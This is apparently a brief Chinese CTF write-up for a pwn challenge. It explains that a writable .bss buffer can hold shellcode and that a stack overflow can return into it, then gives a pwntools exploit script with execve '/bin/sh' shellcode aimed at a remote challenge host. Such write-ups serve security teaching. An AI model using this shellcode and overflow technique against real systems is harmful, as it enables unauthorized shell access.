![[Pasted image 20231220201439.png]]
可以看见有两个read函数
name变量在.bss段
![[Pasted image 20231220201531.png]]
经过gdb调试查看vmmap可以看出该段有读写权限
![[Pasted image 20231220201554.png]]
故可以将shellcode写入name中
然后在buf中栈溢出调用name夺取shell

exp如下：
```python
from pwn import *
p=remote("node4.anna.nssctf.cn",28692)
shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
shell_add = 0x0804851B
name_add = 0x6010A0
p.recvuntil('Please.')
p.sendline(shellcode)
p.recvuntil('start!')
payload = b'a'*(0xA+8)+p64(name_add)
p.sendline(payload)
p.interactive()
```
